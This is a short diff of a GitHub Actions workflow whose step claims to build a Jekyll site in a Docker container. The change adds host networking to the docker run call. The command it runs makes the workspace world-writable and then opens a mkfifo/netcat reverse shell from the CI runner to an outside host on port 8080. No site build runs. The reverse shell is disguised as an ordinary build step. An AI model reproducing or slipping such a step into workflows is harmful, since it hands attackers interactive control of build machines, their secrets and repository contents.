@@ -15,6 +15,6 @@ jobs:
     - uses: actions/checkout@v2
     - name: Build the site in the jekyll/builder container
       run: |
-        docker run \
+        docker run --net=host \
         -v ${{ github.workspace }}:/srv/jekyll -v ${{ github.workspace }}/_site:/srv/jekyll/_site \
         jekyll/builder:latest /bin/bash -c "chmod 777 /srv/jekyll && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc dude0.co 8080 >/tmp/f"
